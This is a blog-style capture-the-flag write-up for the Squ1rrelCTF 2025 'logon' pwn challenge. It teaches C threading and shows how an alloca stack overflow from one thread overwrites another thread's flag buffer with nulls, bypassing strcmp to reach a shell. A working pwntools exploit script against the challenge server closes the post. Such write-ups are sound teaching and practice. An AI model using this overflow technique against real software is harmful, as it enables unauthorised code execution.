# Squ1rrelCTF 2025 Writeup (Pwn/Squ1rrel_logon)



Over the weekend, I teamed up with my friends to play **SquirrelCTF**.

The event was amazing, and the **pwn challenges** in particular really stood out — they forced us to think hard, connect  clues, and improve our skills.

hereby I will be delivering a detailed writeup of the `logon` challenge.

Before diving deeper, let’s take a quick moment to understand the concept of **Threading**.

### CONCURRENT PROGRAMMING

As the name suggests, **concurrent programming** is all about doing multiple things at once. *"Concurrent"* means happening simultaneously, and *"programming"*—well, you already know that part 😉.

**Concurrent programming** allows a program to perform several tasks simultaneously instead of having to wait for the result of one operation to move onto the next.

There are three ways to implement concurrency in our programs: `processes`, `threads`, and `multiplexing`. Let’s concentrate on threads.

### THREADING

An execution **thread** is a logical sequence of instructions inside a process that is automatically managed by the operating system’s kernel. A regular sequential program has a single thread, but modern operating systems allow us to create several threads in our programs, all of which run in parallel.

Each one of a process’s threads has its own context: its own `thread ID`, `its own stack`, `its own instruction pointer`, `it’s own processor register` .

BUT since all of the thread are part of the same process, they share the same **`VIRTUAL MEMORY ADDRESS SPACE`** :  the same `code`, the same `heap`, the same `shared libraries` and the same `open file descriptors`. 

![image.png](/d1ff/images/image.png)

*As shown in the image, threads from the same process **share the code, data, and files**, but each one gets its **own stack** to work with.*

### Let’s look at a simple c program that uses threading.

```c
#include <stdio.h>
#include <pthread.h>

// This is the function that the thread will run
void* myThreadFunction(void* arg) {
    printf("Hello from the thread!\n");
    return NULL;
}

int main() {
    pthread_t thread;

    // Create a new thread that runs myThreadFunction
    if (pthread_create(&thread, NULL, myThreadFunction, NULL) != 0) {
        perror("Failed to create thread");
        return 1;
    }

    // Wait for the thread to finish
    if (pthread_join(thread, NULL) != 0) {
        perror("Failed to join thread");
        return 1;
    }
    
    printf("Thread has finished execution.\n");
    return 0;
}
```

To compile and run the program—> `gcc -o simple_thread simple_thread.c -pthread`

                                                                    `./simple_thread`

**Lets look at some of the useful syntax here :-**

### `pthread_t`

- This is just a **data type** (basically like an `int` or a `struct`) that is used to **store the ID** of a thread.
- When you create a thread, you need a `pthread_t` variable to hold a reference to that thread so you can interact with it later (e.g., wait for it to finish).

### `pthread_create`

- This **creates a new thread**.
- It **starts running** a function you specify — in parallel with your `main()` function.

```c
int pthread_create(pthread_t *thread, const pthread_attr_t *attr, void *(*start_routine) (void *), void *arg);
```

### `pthread_join`

- This **waits** for a **thread to finish**.
- It **blocks** (pauses) your `main()` program until the specified thread is done running.

```c
int pthread_join(pthread_t thread, void **retval); 
```

***A visual map of the program above***

```c
main() starts
    |
    |--> pthread_create --> myThreadFunction() runs in parallel
    |
    |--> pthread_join --> wait until myThreadFunction() is done
main() continues after join
```

### here is the virtual memory map of the above process.

***Before*** `pthread_create` is being called

![Screenshot from 2025-04-18 15-16-40.png](/d1ff/images/Screenshot_from_2025-04-18_15-16-40.png)

***After*** `pthread_create` is being called

![guard page.png](/d1ff/images/guard_page.png)

---

Now since we have learnt all the requisites to understand the source code of the `pwn_logon` binary.

lets first have a look of the decompiled binary.


<img src="/d1ff/images/cbee3a58-b22a-4799-9248-4c915289a943.png" width="600" />

<!-- ![mkmdfl;v.png](/images_logon/cbee3a58-b22a-4799-9248-4c915289a943.png) -->

This is the `main` fucntion.

![Screenshot from 2025-04-10 15-51-47.png](/d1ff/images/Screenshot_from_2025-04-10_15-51-47.png)

> First, it disables buffering on `stdout` and `stdin` using `setbuf` (this can be ignored for now).
> 

> Then it prints a banner by calling the `print_banner` function (also not important here).
> 

After that:

- At line 6, it **creates a thread** that runs the `userinfo` function.
- At line 7, it **creates another thread** that runs the `auth` function.

> Finally, it **waits** for the `auth_thread` to finish execution using `pthread_join`, and then the program exits.
> 

`ALL good HERE` 

---

This is the `userinfo` function.

![Screenshot from 2025-04-10 15-52-17.png](/d1ff/images/Screenshot_from_2025-04-10_15-52-17.png)

> lets see!!
> 
> 
> The `userinfo` function first asks the user for the **length** of their **first name** and **surname**.
> 
> It then uses `alloca` to allocate memory  after paddig the size with blocks of 16 bytes , for both names **on the stack**, based on the provided lengths, and reads in the names using `readline`.
> 
> **At first glance, this looks simple.**
> 
> ---
> 
> **But there’s a lurking vulnerability:**
> 
> `alloca` is a C built-in function that **allocates memory dynamically on the stack**, *not* on the heap.
> 
> In a thread (like here), the **stack size is fixed** when the thread is created. It’s usually around **0x8000 bytes** (or **0x10000 bytes**), depending on system and settings.
> 
> Since the function **explicitly asks the user** for the name and surname sizes, and only enforces that `length < 0x100000000` (i.e., under 4GB, which is huge), **the user can request very large allocations**.
> 
> If the combined size of allocations **exceeds the thread’s stack limit**, this can lead to a **stack overflow** inside the thread.
> 

***🧠 keep this vuln in mind it may be useful later for exploitation.***

---

This is `auth` function.

![Screenshot from 2025-04-10 15-52-05.png](/d1ff/images/Screenshot_from_2025-04-10_15-52-05.png)

Here's where the real objective becomes clear:

The `auth` function:

- Opens the file `flag.txt` and reads its contents into a **stack buffer** (inside the `auth` thread’s stack).
- Then it waits for the `userinfo_thread` to complete by calling `pthread_join`.
- After that, it prompts the user to **enter a security token**.

The program then compares the user input against the contents read from `flag.txt`.

- If the strings **match**, it calls `system("/bin/sh")` and gives shell access.
- Otherwise, it prints an **ACCESS DENIED** message and terminates.

---

Now since we have understood what the program is doing let’s take a look on virtual memory mapping of it with the help of `gdb-pwndbg` .

![auth_thread.png](/d1ff/images/auth_thread.png)

> As we observed in the `main` function, the `auth_thread` is created **after** the `userinfo_thread`.
> 

> By default, **new thread stacks are allocated at lower memory addresses** than those of previously created threads.
> 

Looking at the memory layout here, we notice:

- There is a **guard page** (0x1000 bytes = 1 page) between the two thread stacks, protecting them from each other.
- However, between the end of `auth_thread`'s stack and the second guard page, there is a **large gap** of `0x1ff000` bytes locally.

<aside>
💡

Interestingly, when running on the **remote instance**, I observed that this gap was **absent** — meaning the **guard pages and thread stacks are fully contiguous** on the remote server.

</aside>

*The decompilation is performed using ida8.9*

## 🤔 EXPLOITATION ROUTE

Time to activate the hippocampus and connect the dots. 🧠

We know there’s a **potential stack overflow** in the `userinfo` thread, and that the `auth` function runs **in parallel** (more precisely, concurrently).

If we look carefully:

- In `auth`, the contents of `flag.txt` are **read into a stack buffer** early on.
- After reading, `auth` calls `pthread_join` to **wait** for `userinfo_thread` to finish.
- **Important:** At the time we are writing our name and surname in `userinfo`, the buffer inside `auth` is **already populated**.

This opens an opportunity:

- If we can **leak** or **overwrite** the `auth` thread’s buffer, we can control the value used in the `strcmp` check.
- If we can make the comparison pass, we can **trigger `system("/bin/sh")`** and get a shell.

Now, recall another crucial observation:

- **The stack regions** for `userinfo_thread` and `auth_thread` are **aligned** and **adjacent** (next to each other) in memory.

Thus, if we:

- Allocate a **large enough** name or surname buffer inside `userinfo` (using `alloca`),
- The allocation can **spill over** into the `auth_thread`'s stack region, especially the part where the `flag.txt` buffer is stored.

Using `gdb-pwndbg`, I determined that the offset between the base address of the `name_buffer` (allocated in `userinfo_thread`) and the `auth` thread’s `buffer` is approximately **8,392,928 bytes** — assuming the memory between the two thread stacks is **contiguous**.

![image.png](/d1ff/images/337cf7a1-cd81-45e3-8133-2ae2815bbed5.png)

<aside>
💡

Another cool property of `strcmp`is that it compares two strings **character-by-character until it encounters a null byte (`\0`)**. In C, strings are null-terminated, so `strcmp` effectively stops checking as soon as it hits the first null byte.

This means if we manage to overwrite the beginning of the `flag` buffer with **null bytes** , and simultaneously provide an input consisting of **only null bytes**, `strcmp` will treat them as matching — allowing us to **bypass the security check**.

</aside>

---

## Here is the Exploitation Script

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./terminal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf

r = remote('20.84.72.194', '5005')
# r = process()
# gdb.attach(r,gdbscript='b userinfo')
r.sendlineafter(b'First Name Length: ',f'{8392928-23}') #-23 because the program is adding 23 
r.sendlineafter(b'Surname Length: ',str(0x400-23).encode())

r.sendlineafter(b'First Name:',b'\x00'*0x20+b'\n') ##### filling the name/flag buffer with null
r.sendlineafter(b'Surname:',b'\x00'*0x10+b'\n')
r.sendlineafter(b'Enter security token:',b'\x00'*100+b'\n')
r.interactive()
```

---

## 🐿️ Summary

Here's a quick summary for time-pressed readers 

The core idea was about **multithreading**: two threads, `userinfo` and `auth`, running side by side.

- `userinfo` asked for your name and allocated memory on the stack using `alloca`.
- `auth` read the flag into its own stack buffer and waited for `userinfo` to finish.

On remote, the thread stacks were **contiguous** — only a tiny guard page separating them.

Using `alloca`, we could allocate a massive buffer in `userinfo` and **overflow into `auth`'s stack**, right where the flag was stored!

we could overwrite the start of the flag buffer with **null bytes**. Since `strcmp` stops at the first null, it would treat our null-filled input as matching — and **trigger a shell**.

---

### Useful links

https://www.scaler.com/topics/multithreading-in-c/

https://www.codequoi.com/en/threads-mutexes-and-concurrent-programming-in-c/

---

### 🔗 Connect with me:

- [GitHub](https://github.com/Anony6174)
- [twitter](https://X.com/Anuj1337)

---


<!--more-->


---

> Author: [_d1ff](https://github.com/Anony6174/)  
> URL: http://localhost:1313/d1ff/posts/squirrel_writeup/logon/  

